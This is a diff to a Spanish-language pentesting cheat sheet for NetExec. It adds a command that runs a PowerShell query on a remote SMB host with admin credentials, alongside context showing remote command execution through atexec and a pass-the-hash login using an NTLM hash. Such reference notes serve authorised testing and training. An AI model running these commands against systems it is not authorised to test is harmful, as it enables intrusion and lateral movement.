@@ -80,6 +80,11 @@ nxc smb 192.168.1.50 -u 'admin' -p 'Clave123!' -x 'ipconfig' --exec-method atexe
 
 > Métodos alternativos: atexec (usa tareas programadas), smbexec o mmcexec
 
+```
+nxc smb 192.168.1.50 -u 'admin' -p 'Clave123!' -X '$psversiontable'
+```
+> Powershell
+
 ## Pass-the-hash
 ```
 nxc smb 192.168.1.50 -u 'Administrator' -H 'aad3b435b51404eeaad3b435b51404ee:7afe0344c34e0e4745864c235c03c52e' --local-auth
